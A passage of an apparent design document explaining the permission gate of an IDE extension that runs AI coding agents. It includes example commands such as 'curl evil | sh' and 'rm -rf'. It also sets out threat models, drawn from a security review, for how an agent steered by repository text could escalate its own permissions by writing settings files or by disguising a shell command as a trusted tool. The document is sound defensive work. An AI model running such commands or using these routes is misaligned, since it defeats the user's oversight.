# Permission model

> The reasoning and measurements behind AGENTS.md's rules for permissions.

> **`#NN` refers to a private pre-release tracker.** The numbers are stable *names* for a failure
> mode, not links — the rule each one tags is stated here in full, so nothing is missing if you
> cannot open them.

> Terms used here without definition (the Exp hive, rungs, warm start, the prove-check verdicts, …) are
> in [AGENTS.md](../../AGENTS.md#terms-the-docs-use-without-defining-them).


**Permissions:** `PolicyPermissionHandler` decision precedence = **deny tier** (session-remembered deny command globs → session-remembered deny path globs → remembered-deny by key — the user's own in-session "Deny (this session)" choices, silent auto-deny) → **caution tier** (`AlwaysPromptCommands` — force the banner, flagged; overrides allow AND mode) → **allow tier** (command allow-list → session-remembered command globs → path allow-list → session-remembered path globs → **tool allow-list / session-remembered tools** → remembered-allow by tool name, else kind) → mode → prompt(banner). The deny tier is checked ahead of everything (a user's own deny wins); the caution tier is ahead of every allow/mode (a sensitive pattern always forces review).

**There is no config hard-deny** — the retired `DeniedCommands` became the reviewable caution tier (see below).

**What that precedence governs, and what it does not — three tiers of claim (issue #269, verified live 2026-09-10, proven on both backends 2026-09-11).** Every rule in this file runs on a `session/request_permission` that **arrived**. There is a gate before ours, inside the backend, and `request_permission` is the *agent* asking the *client* — no ACP client can compel an agent to ask. What Code Wicket can honestly claim therefore comes in three tiers, and the patchiness that looked like a design problem is the difference between them:

1. **What runs through us** — the client-owned `fs/write_text_file` route and our own MCP tools (`run_command`, `execute_expression`, `build_solution`, `run_tests`) — we could enforce policy on ourselves, on ANY backend, with no knowledge of its gate. We do not: neither route consults `PolicyPermissionHandler` (it is called only from the request handler), so under a backend that does not ask they run on the agent's say-so. This is the one tier that is genuinely ours, and it is not built (#282).
2. **What the agent asks about** gets our policy as a second gate — **only ever more restrictive than the backend's, never less**. This is the whole of what this file's precedence governs.
3. **What the agent does without asking** is structurally invisible: no banner, no tool-row permission mark, no `[permission]` line. **The failure mode is an absence, and an absence looks like a quiet session** . Measured on one session: 19 frames reached us, 18 `execute` and **one** `read`; every in-project read, every search and three writes to the agent's own state produced nothing at all. Here we can **drive** a lever where the backend offers one, **observe** what it reports, and **warn** — nothing more. **The mode picker means "ask me about everything that reaches me", not "make the backend ask about everything"** — the two are easy to confuse, and a claim that our rules are authoritative across backends reads as unconditional unless it says it covers only the requests that arrive.

**The gate is settings-driven on Claude, and one of its inputs is inside the workspace (#269).** `claude-agent-acp`'s `SettingsManager` watches `~/.claude/settings.json`, `<cwd>/.claude/settings.json`, `<cwd>/.claude/settings.local.json` and the managed path, and `resolvePermissionMode` honours `permissions.defaultMode` from the merge. The SDK's `filterEscalatingDefaultMode` drops escalating values (`bypassPermissions`/`auto`/`acceptEdits`) **only from the repo-committed `project` tier** — `SettingSource = 'user' | 'project' | 'local'`, and `local` is `.claude/settings.local.json`, gitignored and therefore *not* filtered. **Upstream's guard is aimed at the clone-a-hostile-repo vector and works against it; what it does not cover is the agent-writes-it-locally vector, which is the protected-path rule's threat model exactly.** **Note which way the severity runs against that rule** — a write to `config.json` relaxed our second gate while the backend still asked, so the banner still fired and the fix had something to intercept; this removes the first gate, so `Core.ProtectedPaths` never sees a request to flag.

**Proven behaviourally on 2026-09-11 by the Console `backend-gate` proof, whose instrument is the point.** A proof that counts zero `request_permission` frames looks identical to a proof whose instrument is broken, so the proof's permission handler **rejects everything** and the agent is asked to create `probe.txt`: with nothing ever approved by us, a file that exists was approved by someone else — the absence turned into a thing on disk. A control runs first and gates the verdict (a control that sees no request for the probe makes every later case INCONCLUSIVE, never a pass), and a request counts only if it **names** the probe file. The workspace lives under `%LOCALAPPDATA%\code-wicket\proofs`, outside every repository, so no parent `.claude/settings*.json` can affect the result. Two conditions the proof has to meet: the adapter's **vendored** `claude.exe` (2.1.220) rejects a user-level default model it does not support with a 400 before any tool runs, which would make every case INCONCLUSIVE, so the proof passes `--model=sonnet` from the adapter's own list; and Kiro v3 rejects `--agent` at launch (exit 2) exactly as it rejects `--model`, so under v3 `KiroAgentProvider.BuildBaseLaunchArgs` does not pass the flag — the shape the `--model` case already had — and the agent is selected over ACP (`AcpAgentProvider.RequestedSessionModeId` → `session/set_mode`, every v3 agent being a session mode), where a name the engine does not offer, or refuses, is an error notice naming what the session runs as instead — measured: a missing agent opens in Default (`vibe`) with the notice, and the control still asks.

**The lever, where there is one: the backend's mode is a function of OUR picker, never of a file the agent can write.** `AcpAgentConfig.BackendModes` (`BackendPermissionModes`) maps the host's picker onto the agent's own mode ids as **per-agent data**, because ACP standardises what a mode *looks like* on the wire (`currentModeId`, `availableModes`, the config option in category `mode`) and not what it *means*: Claude's `default` is "ask" (renamed "Manual" in Claude Code 2.1.200 with the wire id deliberately kept, so the id is what to pin and the name is what to print), while **Kiro's modes are agent configs** (`kiro_default`, `kiro_planner`; `vibe`/`spec` on v3) and a pin there would switch agents. A guessed id could land on a *more* permissive mode, so an agent with no declaration is never pinned — which is every custom agent. The session asserts the mapped mode via `session/set_config_option` after **every** open — `session/new`, `session/load`, and the load-refused fallback of #268 — and always sends it, never skipping on "already default": the adapter's `currentModeId` is its record, the vendored CLI holds its own copy (the comment at `acp-agent.js:3525` in claude-agent-acp 0.63.0 says the CLI skips the checks itself in bypass), and `set_config_option → applySessionMode → query.setPermissionMode` is what syncs the two. Every host mode maps to the ask mode; **issue #261's planned "Agent Auto" would be a second entry in this map, not a hole in it** — `AutoModeId` is declared (`auto` on Claude) and mapped to nothing, and when something maps to it the mapping must be gated on the session's `availableModes`, which clamp `auto` per model. **An inherited escalation is what gets stopped; a chosen one is a feature.**

**A pin that does not land fails OPEN and says so**, deliberately: refusing every Claude session over an adapter change would take the whole tool down over an update — the ask mode is always advertised, so that is the only way it can fail. Two levels, decided by what the backend reports **after** the attempt: still in the mapped mode — the gate is on, only the assertion failed, a *warning* notice; any other mode, or none — this is the #269 hole itself, so an *error* notice says the picker has no effect on this session, names the setting to remove (`BackendPermissionModes.SettingsHint`, per agent, because the ACP layer does not otherwise know the file) and says to start a new session. The wording is the behaviour and the tests assert it: "could not confirm" alone reads as a diagnostic, and a reader carries on under a gate that is off. Both levels write `[mode] NOT pinned` to `engine.log`; success writes `[mode] pinned '<id>' (<name>); the agent opened in '<id>'`, and `OpenedInModeId` is kept apart from the live `BackendModeId` because "what the file chose" and "what is running" are the two things #270's panel has to say. Offline, the pin is pinned by `AcpConfigOptionTests` (every open path, the two notice levels, the no-declaration case) and proved load-bearing by injecting a session that never pins the declared ask mode after opening.

**Kiro has no lever, and that is a fact about Kiro rather than a gap in the design.** On v2 nothing over ACP or on the launch line restores asking once a workspace agent carries allow rules; what the host can do is *name* the fact. **On v3 that is built**: every mode in the handshake carries `_meta.kiro.source` (`bundled`/`workspace`/`user`) and `resource.source.root`, read into the session's mode origins by walking the vendor bag rather than "kiro" by name, and a configured agent that resolves to a workspace-defined one is applied and announced with a *warning* notice — "an agent defined by the repository under <root>; its tool-trust rules come from the repository, not from your settings" — because the user chose the name and the repository chose what it means. Measured 2026-09-11 (`backend-gate kiro hole --engine=v3 --kiro-agent=shadowtest`): the switch lands, the notice names the root, and the agent's own prompt runs; whether its allow rules then skip the ask was NOT reached, because the model declined the probe as a suspected injection — the gate was never exercised, so that half stays unproven. On v2 the handshake says nothing about origin (the shadow of `kiro_default` is invisible on the wire), so the equivalent is a filesystem check for `<agentRoot>\.kiro\agents\<currentModeId>.json|.md` — not built (#283). **v3 does have a lever, and it is not built** (#285): an agent profile with `{capability: all, effect: ask}` makes the engine ask us about everything, reads included, and the engine takes agent definitions from the client in `session/new`'s `_meta.kiro.customAgents`, origin `client`, overriding a same-named repository file — measured 2026-09-11 with the `backend-gate kiro ask-read-write --client-agent` case. It costs running as OUR agent rather than Kiro's Default (a custom `prompt` sits on Kiro's base prompt, measured with an empty one, but Default's own rules are not inherited) and cannot be combined with a user-configured agent, which is why it is a product decision and not this fix. On v2 the same profile changes nothing: reads never ask. **One thing the experiment fixed on the spot**: a v3 consent's `capability` is the MATCHED RULE's, not the tool's, so under an `all` rule a plain read arrived as `capability: "all"` and the mapper gave it no kind and no path — top tier, matching no path rule, and a user's own `permissions.yaml` `all` rule would do the same. `AcpMapper` now reads `_meta.kiro.toolId` (two spellings on the wire: `fs_write` on a write, `read_file` on a read, so it matches the root of the name) when the capability says nothing, and takes `resource` as the path only for a file tool. The general mitigations that cover every backend are the ones that need no lever: a caution rule on writes to the escalation files themselves — BUILT, see *Escalation files* below — and enforcement at our own tools (tier 1 above, split to #282). What else remains of #269 is split to #283 (the v2 shadow check), #284 (upstream reports), #285 (Kiro agents as a feature) and #286 (whether `permissions.allow` in `settings.local.json` walks past the pin — unmeasured). **Custom ACP agents get tiers 1 and 2 and nothing of tier 3**, and the user documentation says so.

**Modes are a cumulative risk ladder** (`PermissionMode`, retired the old standalone `ReadOnly`): **Prompt** (auto-allows nothing) → **AcceptReads** (auto-allows read-tier) → **AcceptEdits** (auto-allows reads **+** edits) → **AcceptAll** (everything). Each rung raises a ceiling; a request is auto-approved when its resolved **risk tier** (`Read < Edit < Command`) is ≤ the ceiling, else it prompts.

**Risk resolution** (`PolicyPermissionHandler.ResolveRisk`): our IDE MCP tools resolve by **name** via `IdeMcpServer.TryResolveLocalTool` (server-guarded parse of Claude's `mcp__code-wicket__<tool>` / Kiro's `@code-wicket/<tool>`, cross-referenced to a `ToolDescriptor.Risk` map the host wires via `SetToolRisks(ide.Tools.Tools)`) — the name is the ONLY reliable signal since Kiro's `request_permission` carries no kind; **everything else** derives from `kind` (`*read*`→Read, edit/write/create/delete/move→Edit, commands + anything unrecognised→Command top-tier so only AcceptAll auto-allows). `ToolDescriptor.Risk` is authored per-tool in `VsToolCatalog` (rename_symbol/apply_code_fix = `Edit`, the read-only tools default `ReadOnly`), stays **shell-local** (not on the IPC wire — permissions terminate in the shell, which reads the in-proc catalog directly); `PermissionRequest.ToolName` (extracted in `AcpMapper`, on the DTO) carries the namespaced name across the seam. **Where the `kind` comes from**: Kiro's `request_permission` carries no `kind`/`rawInput` — derive `kind` from **v3 `_meta.kiro.consent.capability`** (`fs_write`/`filesystem`→edit, `fs_read`→read, `shell`→execute; other capabilities stay unkinded) with **v2 `_meta.trustOptions[].setting_key`** as fallback (`*write*`→edit, `*command*`→execute, `*read*`→read). Spec-ACP agents (e.g. Claude Code via `@agentclientprotocol/claude-agent-acp`) send a real `kind` + `rawInput` + the standard four option kinds; Claude Code bakes the "always" scope into its `allow_always` option label (`addRules`/`addDirectories`) and self-enforces — which is why we answer `allow_once` to keep our rules authoritative. Legacy config/`session/new` `"ReadOnly"` migrates to `AcceptReads` (`PermissionModeParser.Parse`, `ExtensionConfig.Load`). The old `ReadOnly` mode's hard **auto-reject-everything** is dropped (unused; the summarize session's advisory `ReadOnly` was dead — enforcement is shell-side only, now Prompt). Covered by `IdeMcpServerTests` (server-guard parse) + expanded `PolicyPermissionHandlerTests` (ladder rungs, authored-tool risk, foreign-server guard) + `AcpMapperPermissionTests` (ToolName extraction). Command allow/deny are case-insensitive globs (`*`/`?`), but they match **asymmetrically** — a security boundary, not a symmetry: **allow** (and session-remembered "always" command globs) are **anchored** (`^…$`) and matched against the request's **clean resolved command** (`PermissionRequest.Command`), so a wildcard-free rule means *exact* — `dotnet build` grants only `dotnet build`, NOT `dotnet build && curl evil | sh` (widen with an explicit `dotnet build *`); a non-command request (`Command==null`) can never satisfy the allow-list. the **caution list (`AlwaysPromptCommands`)** stays deliberately aggressive: **unanchored substring** against `Title+Detail`, so a sensitive fragment (`rm -rf`) is caught wherever it appears (incl. `sudo rm -rf /`) — but it only **forces a review** (see the caution-tier flow below), it never silently blocks, so the aggressive matching is safe (a false positive costs one review, not a mystery failure).

**Because risk resolves by NAME, a tool's arguments cannot widen its tier — so a tool must not offer an argument that widens its EDIT.** `apply_code_fix`'s fix-all (issue #91) is capped at one document for exactly this reason: Roslyn's `FixAllScope` also offers Project and Solution, and a `scope:"solution"` call would auto-approve under AcceptEdits identically to a one-line fix — a materially different edit than the tier was reasoned about for. Giving the wide scopes their own tool name (carrying `ToolRisk.Command`, so every invocation prompts below AcceptAll) and deriving risk from the arguments were both weighed and rejected; the second cuts against the name-keyed model, which is the only reliable signal for Kiro's unkinded `request_permission`. The rule is **about the argument, not the reach**: it is emphatically not "an approval never spans more than one file" — `rename_symbol` is solution-wide and authored `Edit`, deliberately, because a semantic rename is one indivisible act the caller cannot scale. What must be capped is a blast radius the *caller* chooses, since nothing downstream re-reads the arguments to reconsider the tier. → [ide-services.md](ide-services.md)

**`PermissionRequest.Command`** is resolved in `AcpMapper.ToPermissionRequest` from the structured `rawInput.command` (Claude/spec-ACP) or the `Running:`-stripped title (Kiro, no rawInput) — it's also what the banner pre-fills as the editable glob (NOT the free-form title).

**An MCP TOOL CALL never resolves a command either, whatever its title looks like** (issue #129) — the same defect as the file-op one below, through the title instead of `rawInput`. Kiro's **default engine** titles a tool call `"Running: @code-wicket/build_solution"`, the very convention it uses for shell commands, so the title fallback resolved the tool NAME as the command: the banner offered an editable **command** glob and "save permanently" wrote `@code-wicket/build_solution` into `allowedCommands`. **Kiro v3 titles the same call bare** (as does Claude, whose `mcp__…` never had the prefix), so it took no command at all — and the persisted rule then matched nothing, going quietly inert while remaining visible in the user's settings. The veto is narrow and keyed on `ExtractToolName` resolving: **`rawInput.command` and the command cache are untouched**, so a tool that genuinely WRAPS a command (our `run_command`, whose argument is literally `command`; a third-party shell server) keeps a real command subject, its glob, and the caution tier's view of what is about to run. Captured frames and the fix are pinned by `ToolTrustTests`.

**A SHELL COMMAND HAS NO TRUSTED NAME, and the shell fact that says so is the backend's, never the title's** (pre-release security review, September 2026). The by-name tier is the only thing standing between a Kiro shell run and a silent approval: Kiro titles one `Running: <whatever the model chose>`, so a model steered into running `@code-wicket/get_diagnostics` — a batch file a cloned repository shipped, or one the agent wrote itself under AcceptEdits — produced a frame whose title lifted out as OUR tool's name (`ExtractToolName`), resolved to get_diagnostics's authored ReadOnly tier, and was approved under AcceptReads with no banner, the audit row calling it a read-only IDE query; a persisted `code-wicket/get_diagnostics` rule approved it under Prompt mode too (`MatchesTool` fires regardless of mode). **The fix is keyed on a fact the title cannot forge**: an execute kind (Kiro v2's `trustOptions`, v3's `consent.capability:"shell"` and Claude's Bash all derive one) or a real command in `rawInput` / the tool_call cache (Claude's PowerShell tool declares `other` and carries it there). Where that fact is present the mapper refuses to lift a name out of the title, so the frame resolves as the command it is (the banner shows it as one and offers a command glob), and the policy trusts NO name at all (`TrustedToolName`, which every by-name grant goes through: the authored tier, the `server/tool` rules and the remember-by-key memory) — so a structured `toolName` beside a `rawInput.command` resolves as the command too. **Where the fact is absent — every real MCP call on both shipping backends (Kiro v3 says `capability:"mcp"`; Claude's rawInput is the tool's own arguments) — nothing changes.** That is the whole difference from an earlier fix that distrusted the title everywhere, which was rejected because Claude's permission frame carries no structured name, so every IDE tool went top-tier there and "Allow always" wrote a rule that could never fire. The one thing that changes hands is an MCP tool whose own schema has an argument literally named `command`: it already resolved a command subject and a command glob in the banner, and now sits at the Command tier on the mode ladder to match; our `run_command` is the only such tool of ours, is authored Command already, and loses only a title-derived name that bought it nothing. **The residual — a Kiro shell request carrying only its title — was measured on the wire and CLOSED positively** (2026-09-09, both engines): Kiro marks BOTH sides of the distinction with disjoint fields the model does not author, so a title-only shell frame is not merely unobserved, it has no shape to arrive in. **v2** (captured on the wire, kiro-cli 2.21.x, 2026-09-09): a shell request carries `_meta.trustOptions[].setting_key:"allowedCommands"` **and** `rawInput.command` on the permission frame itself, two independent shell facts; an MCP call carries `_meta.mcpToolIdentity{serverName,toolName}` and a `rawInput` holding only `__tool_use_purpose`. **v3** (same capture): shell = `_meta.kiro.toolId:"run_command"` + `_meta.kiro.command` + `consent.capability:"shell"`; MCP = `toolId:"mcp_code_wicket_*"` + `consent.capability:"mcp"` + `consent.resource` + `_meta.kiro.mcpTool.identity`, with no command. We read none of the MCP identity fields — the title is still what names an MCP tool, safe because the shell fact gates it (issue #266 is reading the identity instead). Pinned by `ShellCommandImpersonationTests` from the finding's own frame shapes, both halves: the impersonating frames prompt, the real calls keep their tier.

**Per-tool trust is `AllowedTools`** (issue #129) — the durable home the accident above was standing in for, and it covers EVERY MCP server, not only ours. **One rule shape, and the server in it is the collision guard** (`IdeMcpServer.TryNormalizeToolRule`): every rule is canonical **`server/tool`**, ours included — `code-wicket/build_solution`, `github/create_issue`. So a rule can never auto-approve another server's tool of the same name, in either direction. It does not need scoping to our own catalog: a foreign tool cannot be matched safely only by a **bare** rule, and keeping the server dissolves that. Ours are stored with the server too — a bare rule of ours would be **safe** (only reachable through the server-anchored unwrap) but is wrong to persist: a stored list should show a hand-editor its own format, and no reader should have to know that "bare means ours". A bare name typed into settings is still accepted and gains the server on save. **Normalization is idempotent, and that is load-bearing** — the list is re-normalized on every config load and every `SetToolPolicy`, so a rule that couldn't survive its own output shape would be dropped on the next read and every stored grant silently forgotten one restart after it was made. **Exact names, not globs** — a rule names one tool, so there is nothing to widen and a wildcard could only widen it by surprise; the banner's step shows the name **read-only** and exists for the persist checkbox alone. It sits in the allow tier immediately ahead of remember-by-key (what a tool "always" falls back to when there is no rule to save), so **deny and caution still win** — a sensitive `AlwaysPromptCommands` pattern still forces the banner however the tool is trusted, since the caution tier reads `Title+Detail` and `Detail` carries the tool's arguments. Note also that an explicit named grant is **narrower than the alternative**, which is raising the whole permission mode.

**A foreign rule is matched by CONSTRUCTION, never by parsing the incoming name** (`IdeMcpServer.NamesSameTool`). Decomposing an unknown server's Claude-form name is genuinely ambiguous — `mcp__a__b__c` could be server `a` or server `a__b` — so the rule builds both spellings from its own halves and compares. A mis-split therefore still reproduces the name it came from exactly: it can cost that one rule its cross-backend portability, and can never widen it onto a tool it doesn't name. The **server** half is offered hyphenated and underscored (Kiro v3 underscores server names); the **tool** half never is, because `run_tests` and `run-tests` are different tools.

Config's `allowedTools` is surfaced in Unified Settings (Permissions → **Allowed MCP tools**) because **a permanent grant needs a visible revoke**, and lines are normalized on the way in so a name pasted from a log becomes the rule that actually matches. **Every namespaced name already in `allowedCommands` migrates on load** (`ExtensionConfig.MigrateToolRulesOutOfCommands`) — both backends' spellings are a shape no shell command shares — or a grant the user made would go inert the moment the mapper stopped inventing commands. Foreign entries migrate too: left behind, each would be exactly the dead rule you can still see that the migration exists to prevent.

**A file-op kind (edit/write/create/delete/move/read) never resolves a command** (`AcpMapper.IsFileOpKind`, and `CacheToolCommand` won't cache one either): Kiro's `write` tool puts an **operation discriminator** in `rawInput.command` (`"strReplace"`/`"create"`/…) that is NOT a shell command — surfacing it routed edits onto the *command* allow-list, so an "always" on one edit remembered the glob `strReplace` and silently blanket-approved every string-replace to any file (fixed; edits are path-scoped, `AcpMapperCommandTests`).

**Banner ↔ transcript:** the banner carries the request's `ToolCallId`, and `ChatViewModel.UpdatePermissionHighlight` outlines (accent border) + expands the correlated transcript row (`ToolItemViewModel` by id, else the Kiro-style `EditItemViewModel` card keyed `toolCallId|path`) while the prompt is up, reverting the prior expand state on dismiss (`ChatItemViewModel.IsHighlighted`, transient/never persisted).

**Edit detail — native diff, not text:** the diff is a rich artifact, so it goes to the **native VS diff viewer**, not a text dump in cramped chrome (and the UI never decodes provider rawInput shapes — that belongs in `AcpMapper`). `AcpMapper.ExtractEditMeta` normalizes the agent's **intent** (`__tool_use_purpose`/`description`) and the backend's **operation** (Kiro's `rawInput.command`, e.g. `strReplace` — a display label, NOT a shell command) onto `AgentEvent.EditProposed.Intent`/`Operation` (→ DTO `EditIntent`/`EditOperation` → `EditItemViewModel`), so the edit card shows them as detail (intent = the "why" subtitle like tool rows; operation = a right-docked label) while its click still opens the native diff. The **edit prompt** drops the raw JSON entirely: banner body is empty for edits (`DisplayDetail` null), the intent shows as a subtitle, and a **"View diff"** button opens the native diff for review-before-approve — at edit-permission time the file on disk is still the old version, so it's a true old-vs-proposed preview. `ChatViewModel.ResolveEditBannerContext` sources the intent from the request tool input (`ExtractToolIntent`) and REUSES the correlated transcript row's `OpenDiffCommand` (edit card or folded tool row) for View diff — no diff text re-crosses, and a host with no diff viewer (Desktop) just hides the button. Commands still show the resolved command; other kinds the raw detail. Proven offline in Desktop `--smoke` (highlight+expand+revert; edit banner = intent + View diff wired to the native diff, no raw JSON) + `--screenshot-edit`, and `AcpMapperEventTests` (intent/operation extraction; Claude edits leave both null). Covered by `CodeWicket.Tests` (`PolicyPermissionHandlerTests` pins the escalation guard + allow/deny asymmetry; `AcpMapperCommandTests` pins command extraction from real frame shapes).

**Scoped rules (the scoped-permission model, built 2026-07-20):** file-scoped requests carry a **`PermissionRequest.Path`** subject (absolute path, resolved in `AcpMapper.GetPathSubject` per backend: Kiro v3 `_meta.kiro.consent.resource`+`workspaceRoot` (fs capabilities only — a shell consent's resource is the command text), Kiro v2 `_meta.trustOptions[].patterns` (the "Specific paths" row wins), spec-ACP `rawInput.file_path`/`path`, then `locations[0].path`; `file:///c%3A/…` URIs normalize to local paths) — and **path allow rules** (config `AllowedPaths` + session-remembered path globs) match against it exactly like command rules match `Command`: **anchored**, case-insensitive, slash-direction-normalized, never matching a request without a Path. "Always" is session-scoped by default; for commands AND edits the banner offers an editable glob + a "save permanently" checkbox (persists to config `AllowedCommands`/`AllowedPaths`); the edit step pre-fills the file path with **This file / This folder** shortcuts (`PermissionBannerViewModel.ScopeChoices`, mirroring Kiro's own trust choices).

**AN MCP TOOL HAS NO PATH SUBJECT EITHER, and the gate is the namespaced tool NAME** — the companion to the command veto above, through `rawInput.path`/`file_path`/`locations[0].path` instead of the title, and the one that widens a grant rather than wasting one. An MCP call's `rawInput` follows a THIRD PARTY's schema, so a key named `path` means whatever that server says it means; it is not a file this host is being asked to let the agent edit. Kiro sends **no `kind`** for one and `DeriveKind` returns null by design (“MCP risk resolves by tool name”), so the command gate catches nothing here and every fallback below it fired. **Three failures rode on the one field and they closed a loop**, the same defect minting the over-broad rule and then honouring it: a persisted `AllowedPaths` glob **auto-approved the call with no banner** (while `PolicyPermissionHandler`'s own comment asserted that “requests without a Path (commands, MCP tools) can never satisfy a path rule”); the banner offered a **path-scoped “Allow always”**, widenable to the folder, and — `HasToolScope` being gated on `!HasPathScope` — **suppressed the `server/tool` rule that is an MCP tool's durable home**, so the correct rule was unreachable for exactly these calls; and `DisplayDetail` is null under a path scope, so the call was approved **with its arguments hidden**, the banner having taken it for an edit whose change is in the diff viewer. The escalation shape: an “Allow always” on an edit under `C:\repo` widened to `C:\repo\**`, and a foreign `deploy` tool taking `{"path":"C:\repo\dist"}` then ran unprompted. **Anchored on the namespace so it costs nothing that has a real file subject** — `ExtractToolName` resolves only `mcp__*` / `@server/tool`, and Claude's `Edit` and Kiro's fs writes are neither. Pinned from the WIRE in `PolicyPermissionHandlerTests`, not from a hand-built request: the missing half sat upstream of the handler, so a request built with `Path: null` passes over the fix without touching it.

**We own EVERY "always" client-side:** every auto/remembered approval answers the agent with **`allow_once`** (`Decide` strictly prefers the once-kind), and picking "allow always" — command, edit, or MCP tool — stores our rule (command glob / path glob / remember-by-`tool:<name>` key, else kind) but still returns `allow_once`, so the agent keeps asking and our policy auto-approves, uniformly across backends, instead of the agent persisting its own always-rule (Claude writes its settings, Kiro v3 its permissions.yaml).

**This now covers deny too (built 2026-07-21):** picking the deny-always option stores a **session** deny glob (command or path, anchored like the allow twins) or a remember-by-key deny (`RememberDeny`) and answers the agent **`reject_once`**, so we own the block uniformly across backends. Deny is **session-only by design**: there is deliberately no persist path, and the banner's "save permanently" checkbox hides for a deny (`PermissionBannerViewModel.IsDenyEdit`/`CanPersist`; the scoped-edit step — editable glob + This file/This folder — is otherwise shared with allow). The button reads **"Deny (this session)"** (`PermissionOptionViewModel.DisplayLabel`), honest because we always enforce it session-scoped.

**Claude Code never sends `reject_always`** (its set is Allow / Allow always / Deny — proven from the engine channel), so `AcpMapper.ToPermissionRequest` **synthesizes** a session-deny option (`SyntheticDenySessionOptionId`, kind `RejectAlways`) when the backend offers a `reject_once` but no `reject_always` **and** the request has a denyable subject (a command, a file path, or a named MCP tool — a bare unkinded request is skipped as too coarse). The sentinel id is consumed shell-side (the `RejectAlways` branch → `RememberDeny` + real `reject_once`) and **never sent to the agent**.

**Caution tier — `AlwaysPromptCommands` (converted from the retired hard-deny `DeniedCommands`, 2026-07-21):** an aggressive unanchored-substring list of *sensitive* commands that must ALWAYS be reviewed. A match **forces the banner even under an auto-approve mode AND overrides the allow-list** ("always" means always — you can't allow-list or AcceptAll your way past it), and **flags** the request: `PolicyPermissionHandler` sets `PermissionRequest.FlaggedFragment` to the exact matched text (via `MatchFragment`, threaded onto the request `with { FlaggedFragment }` → DTO → banner). The banner then (a) draws a **red outline**, (b) **calls out the matched fragment in red** ("⚠ Matches your always-prompt rule: `rm -rf`") AND highlights that fragment inline **inside the command text** (`Controls.TextHighlighter` attached property → a `TextBlock` with per-`Run` brushes, since a `TextBox` can't colour a substring; the flagged command box swaps to this non-selectable display via `ShowCommandBox`/`ShowHighlightedCommand`), (c) **strips "Allow always"** entirely (a sensitive pattern can never be blanket-/session-allowed), (d) gates a one-time Allow behind a concise **inline confirm step** (`PermissionBannerViewModel.IsConfirmingAllow` / `ConfirmFlaggedAllowCommand`; the confirm doesn't repeat the rule call-out already shown above), and (e) flips the accent-fill emphasis from Allow to **Deny** (`PermissionOptionViewModel.IsEmphasized`, set by the banner) so the blue never steers a reflexive Allow — the anti-fat-finger design.

**NOT a silent block — every match is reviewable** (this replaced the old silent hard-deny, whose worst trait was an unexplained agent failure). Deny still stays easy on a flagged request (Deny + the synthesized "Deny (this session)" remain). Config migrates an older `deniedCommands` array into `AlwaysPromptCommands` on load (`ExtensionConfig.ReadLegacyStringArray`). Keep the list short/high-signal (ships empty) — over-firing trains click-through and dilutes the red. Covered by `PolicyPermissionHandlerTests` (forces review under AcceptAll + flags the fragment; overrides the allow-list; unflagged carries no fragment) + Desktop `--smoke` (flagged banner strips always-allow + confirm gate) + `--screenshot-flagged`.

**Deny rules and the synthesized "Deny (this session)"** are covered by `PolicyPermissionHandlerTests` (deny command/path globs, deny-wins-over-allow, no-persist, mode-reset, sentinel→real-reject_once) + `AcpMapperPermissionTests` (synthesis: scoped command/path/MCP-name yes, has-reject_always/unscoped/no-reject_once no) + the Desktop `--smoke` session-switch check (a pending banner is cancelled + cleared on New/switch — `ChatViewModel.ClearPermissionQueue`).

**Protected paths — a write into the extension's own state (pre-release security review, September 2026; `Core.ProtectedPaths`):** the second built-in occupant of the caution tier, and, like the escalation-file and linked-write rules below, code rather than config. The shape: under AcceptEdits an agent steered by repository text issues a Write for `%APPDATA%\code-wicket\config.json`; the mode ladder classified it Edit-tier by kind alone, so it was approved with no banner. `ChatToolWindow.OnConfigChanged` then re-reads that file on the next settings save (a picker change, a zoom, a banner persist) and installs its `defaultPermissionMode`, `allowedCommands`, `allowedPaths` and `allowedTools` into the running policy — AcceptAll plus `allowedCommands: ["*"]` is unrestricted command execution mid-session — and the next window open spawns whatever `kiroCliPath` / `claudeAcpPath` / `customAcpAgents` / `engineEnvironment` name. **The guard** is `PolicyPermissionHandler.IsProtectedWrite`: a file-scoped request that is not a read, whose `Path` lies under `StoragePaths.Roaming` or `StoragePaths.Local` (`WorkspacePath.IsUnderRoot` — lexical containment with the separator, so a sibling folder is outside), is treated as flagged with the path as the fragment: banner forced under every mode, "Allow always" stripped, the confirm gate, and checked AHEAD of the path allow-list and the remembered globs, so the persisted `C:\Users\<u>\*` rule the attacker's write would add cannot lift it. **Not a configured rule, deliberately**: an `AlwaysPromptCommands` entry naming the folder would work and is in the file the first write replaces; `ProtectedPaths` is a property with no config reader (`Default` on construction, `None` for a host with no state, fake roots in the tests). **Reads are exempt** (a read grants nothing), and so are the agent's own workspaces under Local — `StoragePaths.DefaultAgentWorkspace` / `StubAgentWorkspace`, named THERE so the exemption and the cwd the host hands out cannot disagree — because with no solution open every edit lands under Local, and a rule that fires on ordinary work trains click-through. **The banner and the row say why**: `PermissionRequest.FlaggedReason` replaces "Matches your always-prompt rule" with "Writes Code Wicket's own settings", and `PermissionOutcome.CautionReason` (on the DTO, so a reopened transcript keeps it) completes the row's "You were asked because …"; both sentences live in `ProtectedPaths` because the wording is the behaviour, and the always-prompt sentence would have sent the user to their settings looking for a rule they never wrote. **The containment itself resolves no reparse points**, and that gap is closed by the link rule below (`Core.LinkedWrite`) rather than by this one: a link is not something a lexical test can see, and following one to find out is the operation the inline-image containment refuses. **Not built**: a check on the config.json file itself — hashing the launch-time fields against the settings provider, and prompting on a config change not made through VS or our banner. Its original reason for waiting, that a shell command is the Command tier's concern, was weakened by #269. The engine executable override (`engineExePath`) left config.json in the same change; it is `CWKT_ENGINE_EXE` only. Covered by `PolicyPermissionHandlerTests` (the protected-path block) + `DtoMappingTests` (both reasons round-trip); an injection removing the containment check proven LOAD-BEARING (5 of 127 after the command route landed).

**Protected paths, command route (2026-09-13; `ProtectedPaths.MatchCommandText`):** the escalation files' command route, applied to the one file here that grants. The path route used to be the whole rule, a shell command being left to the Command tier; #269 took the premise out from under that (a backend that approves a command itself sends no request, so no tier of ours runs), and the escalation files meanwhile took both routes with no reason recorded for the difference. **One spelling**: `code-wicket\config.json`, either separator, any case, not glued to a longer name (`my-code-wicket\…`, `config.json.bad`). The bare file name is every project's `config.json`; the bare folder — the `.kiro/agents` precedent — is also the Local root's name with the no-solution workspace under it, so every command run there would go red. Only `config.json`, because it is the file read back into the running policy; sessions and logs stay the path route's alone. The name is `StoragePaths.SettingsFileName`, shared with `ExtensionConfig.DefaultPath`, so a rename cannot leave the matcher looking for a file nothing reads. **Reads are flagged too** (a command line cannot tell them apart), and so is a repository folder that happens to be called `code-wicket` — both the caution tier's direction. **A spelling test and nothing more, and no doc may claim otherwise**: `cd $env:APPDATA\code-wicket; 